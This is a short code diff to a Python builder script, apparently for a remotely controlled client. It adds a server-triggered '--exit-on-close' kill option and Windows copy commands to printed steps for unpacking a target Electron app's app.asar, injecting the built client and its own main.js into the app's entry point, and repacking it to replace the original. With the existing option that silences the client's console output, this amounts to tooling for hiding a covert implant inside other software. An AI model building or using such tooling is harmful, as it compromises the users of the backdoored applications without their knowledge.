@@ -17,6 +17,8 @@ def add_arguments(parser):
                      help="Build for Electron (uses fetch and native WebSocket for proxy awareness).")
     builder.add_argument("--no-print", action="store_true",
                      help="Compile output-suppression into the client (console.* and process.stdout/stderr are redirected to a null sink at startup).")
+    builder.add_argument("--exit-on-close", action="store_true",
+                     help="Call process.exit(0) when the server sends a kill signal, terminating the host process.")
 
     cfg = parser.add_argument_group("Client configuration")
     cfg.add_argument("--server-url", default="localhost:8080",
@@ -77,7 +79,10 @@ def build(args):
         print("    npx asar extract path/to/app.asar unpacked/")
         print("    # open unpacked/package.json and note the \"main\" field --")
         print("    # that's the app's entry point (e.g. main.js, index.js, dist/main.js)")
-        print(f"    cp {out_path.name} main.js renderer.html unpacked/")
+        if its.windows:
+            print(f"    Copy-Item {out_path.name}, main.js, renderer.html -Destination unpacked\\")
+        else:
+            print(f"    cp {out_path.name} main.js renderer.html unpacked/")
         print("    # edit the entry point to add:  require('./main.js')")
         print("    npx asar pack unpacked/ app.asar")
         print("    # replace the target's app.asar with this one")
